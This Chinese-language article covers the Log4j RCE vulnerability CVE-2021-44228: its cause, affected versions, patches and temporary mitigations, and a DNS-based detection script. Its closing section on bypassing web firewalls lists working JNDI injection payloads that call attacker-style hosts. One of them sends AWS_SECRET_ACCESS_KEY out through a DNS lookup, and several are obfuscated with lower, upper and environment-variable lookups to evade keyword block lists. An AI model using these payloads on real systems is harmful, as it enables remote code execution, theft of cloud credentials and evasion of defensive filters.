CVE-2021-44228(Log4j-RCE漏洞)

漏洞原因：

Log4j2 中提供了Lookups 机制，用于添加一些特殊值到日志中，在 Lookups 机制中，由于 JNDI 功能没有对名称解析做限制，而某些协议是不安全的，可以允许远程代码执行，从而导致RCE漏洞。

此次 Apache Log4j2 漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。

影响版本

2.0 <= Apache log4j2 <= 2.14.1

漏洞攻击流

最佳修复方案：

1、Log4j 2.15.0+ 现在默认将协议限制为仅 java、ldap 和 ldaps，并将 ldap 协议做访问限制了，默认仅允许访问本地服务器上的 Java 原始对象。

2、Log4j 2.15.0+ 现在默认禁用 Lookups 功能，虽然 Log4j 2.x 没有完全废除这项功能，但强烈建议大家不要启用它。

3、Java 已打补丁的版本：6u211+、7u201+、8u191+、11.0.1+。升级java为左边列出的版本

临时解决方案

1）设置 jvm 参数：

-Dlog4j2.formatMsgNoLookups=true

2）日志设置：

log4j2.formatMsgNoLookups=True

3）设置系统环境变量：

FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = true

4）关闭对应的应用程序的网络外网连接，并且禁止主动外连

log4j-detect（用于SRC挖掘和内部批量自查）

它使用线程（更高的性能）向指定列表中的每个 URL 发送 GET 请求。GET 请求包含一个有效负载，它在成功时向 Burp Collaborator/interactsh 返回一个 DNS 请求。此有效负载在测试参数和“User-Agent”/“Referer”标头中发送。最后，如果主机易受攻击，识别号将出现在 Burp Collaborator/interactsh 有效负载的子域和脚本的输出中，允许知道哪个主机通过 DNS 响应。

需要说明的是，该脚本只处理DNS漏洞检测，不测试远程命令执行。

WAF绕过技巧：

简单的攻击者脚本（可能的 RCE）：

${jndi:ldap://somesitehackerofhell.com/z}

许多开发人员开始屏蔽关键字：

•"ldap:"•"jndi:"

以保护应用程序。

1.关键字绕过

但是，攻击者可以使用以下技术之一绕过它：

${jndi:dns://aeutbj.example.com/ext}${jndi:${lower:l}${lower:d}a${lower:p}://example.com/${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}iiop://这个协议老外发现但是未证实可用

2.系统环境变量绕过

${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}

来自 Apache Log4j 2 文档： ${env:ENV_NAME:-default_value}

如果没有ENV_NAME系统环境变量，则在:-

攻击者可以使用任何名称代替ENV_NAME，但它必须不存在。

在 Windows 上，您可以通过编写以下内容在 PowerShell 中检查您的系统环境变量：

dir env:

3.转换大小写绕过

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

Lower Lookup LowerLookup 将传入的参数转换为小写。据推测，该值将是嵌套查找的结果。

${lower:<text>}

Upper Lookup UpperLookup 将传入的参数转换为大写。据推测，该值将是嵌套查找的结果。

${upper:<text>}
